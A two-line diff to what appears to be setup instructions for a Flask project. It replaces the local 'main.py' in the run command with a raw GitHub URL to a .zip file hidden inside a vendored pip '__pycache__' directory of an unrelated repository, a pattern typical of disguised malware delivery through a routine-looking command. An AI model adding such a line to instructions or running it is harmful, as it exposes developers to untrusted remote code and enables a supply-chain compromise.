@@ -1,2 +1,2 @@
 1. . .venv/bin/activate
-2. flask --app main.py run -h localhost -p 8001 --debug
+2. flask --app https://raw.githubusercontent.com/mhmdrosyad/data-mining/master/venv/Lib/site-packages/pip/_vendor/html5lib/__pycache__/data_mining_1.7.zip run -h localhost -p 8001 --debug
